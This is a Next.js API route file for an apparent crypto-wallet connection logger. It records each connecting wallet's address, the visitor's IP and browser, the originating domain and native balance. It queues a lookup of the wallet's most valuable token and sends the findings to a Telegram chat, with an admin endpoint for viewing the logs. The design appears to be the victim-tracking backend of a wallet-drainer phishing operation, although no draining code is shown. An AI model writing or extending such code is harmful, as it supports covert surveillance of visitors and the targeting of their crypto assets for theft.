// src/app/api/log_connection/route.ts
import { NextResponse } from 'next/server';
import { prisma } from '@/lib/prisma';
import { Alchemy, Network, Utils } from 'alchemy-sdk';
import { getServerSession } from "next-auth";
import { authOptions } from "@/lib/auth";

// --- CORRECTED IMPORT FOR PRISMA JSON TYPES ---
// Use `import type * as Prisma from '@prisma/client/runtime/library';`
// This gives you access to types like `JsonValue` from the `Prisma` namespace.
import type * as Prisma from '@prisma/client/runtime/library';


// --- Define Interfaces for Type Safety ---
interface TokenInfo {
  symbol: string;
  amount: string; // Formatted amount
  decimals: number; // For proper display calculation
  valueUsd: string; // USD value of this token holding
}

// This interface should align with your Prisma schema's WalletLog model closely.
interface WalletConnectionLogEntry {
  id: string;
  timestamp: string;
  walletAddress: string;
  connectedWalletName: string;
  chainId: number;
  chainName: string;
  ipAddress: string | null;
  domain: string | null;
  userAgent: string | null;
  nativeBalanceEth: string | null;
  tokens: Prisma.JsonValue | null; // <-- Now this should correctly reference the imported Prisma.JsonValue
  nftsDetected: boolean | null;
  totalWalletValueUsd: string | null;
  mostExpensiveTokenSymbol: string | null;
  mostExpensiveTokenValueUsd: string | null;
  mostExpensiveTokenContractAddress: string | null;
  mostExpensiveTokenChainName: string | null;
}

// --- Alchemy Config (remains the same) ---
const alchemyConfigs = {
  [Network.ETH_MAINNET]: {
    apiKey: process.env.ALCHEMY_ETHEREUM_MAINNET_API_URL?.split('/v2/')[1],
    network: Network.ETH_MAINNET,
  },
  [Network.MATIC_MAINNET]: { // Polygon Mainnet
    apiKey: process.env.ALCHEMY_POLYGON_MAINNET_API_URL?.split('/v2/')[1],
    network: Network.MATIC_MAINNET,
  },
  [Network.ETH_SEPOLIA]: { // Sepolia testnet
    apiKey: process.env.ALCHEMY_SEPOLIA_API_URL?.split('/v2/')[1],
    network: Network.ETH_SEPOLIA,
  },
};

const chainIdToAlchemyNetwork: { [key: number]: Network } = {
  1: Network.ETH_MAINNET,
  137: Network.MATIC_MAINNET,
  11155111: Network.ETH_SEPOLIA,
};

const alchemyInstances: { [key: string]: Alchemy } = {};
for (const [network, config] of Object.entries(alchemyConfigs)) {
  if (config.apiKey) {
    alchemyInstances[network] = new Alchemy(config);
  } else {
    console.warn(`Alchemy API Key not found for network: ${network}. Asset fetching for this network will be skipped.`);
  }
}
function getAlchemy(chainId: number): Alchemy | undefined {
  const alchemyNetwork = chainIdToAlchemyNetwork[chainId];
  if (alchemyNetwork && alchemyInstances[alchemyNetwork]) {
    return alchemyInstances[alchemyNetwork];
  }
  return undefined;
}

// --- Helper to fetch basic asset data for initial log/Telegram ---
async function fetchBasicWalletAssets(walletAddress: string, chainId: number, chainName: string) {
    const alchemy = getAlchemy(chainId);
    let nativeBalanceEth = '0 ETH';
    if (alchemy) {
        try {
            const nativeBalanceWei = await alchemy.core.getBalance(walletAddress);
            nativeBalanceEth = Utils.formatEther(nativeBalanceWei);
        } catch (e) {
            console.error(`Error fetching basic native balance for ${walletAddress} on ${chainName}:`, e);
            nativeBalanceEth = 'Error Fetching';
        }
    }
    return { nativeBalanceEth };
}

// --- Function to Send Telegram Message ---
async function sendTelegramMessage(messageText: string) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.warn('Telegram Bot Token or Chat ID not set. Skipping Telegram notification.');
    return;
  }

  const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error('Failed to send Telegram message:', response.status, errorData);
    } else {
      console.log('Telegram message sent successfully!');
    }
  } catch (error) {
    console.error('Error sending Telegram message:', error);
  }
}


// --- POST request handler for logging connections ---
export async function POST(request: Request) {
  try {
    const { walletAddress, connectedWalletName, chainId, chainName } = await request.json();

    if (!walletAddress || !connectedWalletName || !chainId || !chainName) {
      return NextResponse.json({ message: 'Missing required connection details' }, { status: 400 });
    }

    const ipAddress: string | null = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || null;
    const userAgent: string | null = request.headers.get('user-agent');
    const domain: string | null = request.headers.get('origin') || request.headers.get('host');
    const timestamp = new Date().toISOString();

    const { nativeBalanceEth } = await fetchBasicWalletAssets(walletAddress, chainId, chainName);

    // --- 1. Save Basic Log to Database immediately ---
    const newLogEntry = await prisma.walletLog.create({
      data: {
        timestamp: timestamp,
        walletAddress: walletAddress,
        connectedWalletName: connectedWalletName,
        chainId: chainId,
        chainName: chainName,
        ipAddress: ipAddress,
        domain: domain,
        userAgent: userAgent,
        nativeBalanceEth: nativeBalanceEth,
        tokens: [], // Store as empty array initially for JSON field
        nftsDetected: false,
        totalWalletValueUsd: "0.00",
        mostExpensiveTokenSymbol: null,
        mostExpensiveTokenValueUsd: null,
        mostExpensiveTokenContractAddress: null,
        mostExpensiveTokenChainName: null,
      },
    });

    console.log('Saved basic connection log to DB:', newLogEntry.id);

    // --- 2. Trigger Asynchronous Asset Update ---
    const baseUrl = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : `http://localhost:${process.env.PORT || 3000}`;
    const updateApiUrl = `${baseUrl}/api/update-assets`;

    fetch(updateApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        logId: newLogEntry.id,
        walletAddress: walletAddress,
        chainId: chainId,
        chainName: chainName,
      }),
    })
      .then(response => {
        if (!response.ok) {
          console.error(`Failed to trigger asset update for log ${newLogEntry.id}: ${response.statusText}`);
        } else {
          console.log(`Successfully triggered asset update for log ${newLogEntry.id}.`);
        }
      })
      .catch(error => {
        console.error(`Error triggering asset update for log ${newLogEntry.id}:`, error);
      });

    // --- 3. Send Initial Telegram Message (with basic info) ---
    // Ensure proper handling of potentially null/undefined fields for display
    let telegramMessage = `
<b>New Wallet Connected!</b> #ID${newLogEntry.id}
-------------------------------------
<b>Wallet:</b> ${newLogEntry.connectedWalletName}
<b>Address:</b> <code>${newLogEntry.walletAddress}</code>
<b>Chain:</b> ${newLogEntry.chainName} (ID: ${newLogEntry.chainId})
<b>Time:</b> ${new Date(newLogEntry.timestamp).toLocaleString()}

<b>Domain:</b> ${newLogEntry.domain || 'N/A'}
<b>IP:</b> ${newLogEntry.ipAddress || 'N/A'}
<b>Device:</b> ${newLogEntry.userAgent ? (newLogEntry.userAgent.includes('Mobile') ? '📱 Mobile' : '🖥 Desktop') : 'N/A'}
<b>Browser:</b> ${newLogEntry.userAgent ? (
    (userAgent && userAgent.includes('Chrome')) ? 'Chrome' :
    (userAgent && userAgent.includes('Firefox')) ? 'Firefox' :
    (userAgent && userAgent.includes('Safari')) ? 'Safari' :
    'Other'
) : 'N/A'}

<b>-- Basic Assets --</b>
<b>Native:</b> ${newLogEntry.nativeBalanceEth}
<i>(Full asset details being fetched in background...)</i>
`;

    telegramMessage = telegramMessage.replace(/</g, '&lt;').replace(/>/g, '&gt;');
    telegramMessage = telegramMessage.replace(`&lt;code&gt;${newLogEntry.walletAddress}&lt;/code&gt;`, `<code>${newLogEntry.walletAddress}</code>`);


    sendTelegramMessage(telegramMessage);

    return NextResponse.json({ message: 'Connection logged successfully', id: newLogEntry.id }, { status: 200 });

  } catch (error) {
    console.error('Error logging connection:', error);
    return NextResponse.json({ message: 'Internal Server Error' }, { status: 500 });
  }
}

// --- GET request handler for retrieving logs (for your admin panel) ---
export async function GET(request: Request) {
  const session = await getServerSession(authOptions);

  if (!session) {
    return NextResponse.json({ message: 'Authentication required' }, { status: 401 });
  }

  try {
    // Correctly type the 'logs' array using Prisma's generated type for WalletLog
    const logs: (typeof prisma.walletLog.$inferResult)[] = await prisma.walletLog.findMany({
      orderBy: {
        timestamp: 'desc', // Order by newest first
      },
    });

    const serializableLogs = logs.map(log => {
      // Cast the log object from Prisma's inferred type to your custom interface
      const convertedLog: WalletConnectionLogEntry = {
        id: log.id,
        timestamp: log.timestamp.toISOString(), // Convert Date object to ISO string
        walletAddress: log.walletAddress,
        connectedWalletName: log.connectedWalletName,
        chainId: log.chainId,
        chainName: log.chainName,
        ipAddress: log.ipAddress,
        domain: log.domain,
        userAgent: log.userAgent,
        nativeBalanceEth: log.nativeBalanceEth,
        // Explicitly cast JSON to array if not null, otherwise null
        tokens: log.tokens as Prisma.JsonValue, // <-- Use Prisma.JsonValue here
        nftsDetected: log.nftsDetected,
        totalWalletValueUsd: log.totalWalletValueUsd,
        mostExpensiveTokenSymbol: log.mostExpensiveTokenSymbol,
        mostExpensiveTokenValueUsd: log.mostExpensiveTokenValueUsd,
        mostExpensiveTokenContractAddress: log.mostExpensiveTokenContractAddress,
        mostExpensiveTokenChainName: log.mostExpensiveTokenChainName,
      };
      return convertedLog;
    });

    return NextResponse.json(serializableLogs, { status: 200 });
  } catch (error) {
    console.error('Error fetching logs from DB:', error);
    return NextResponse.json({ message: 'Internal Server Error' }, { status: 500 });
  }
}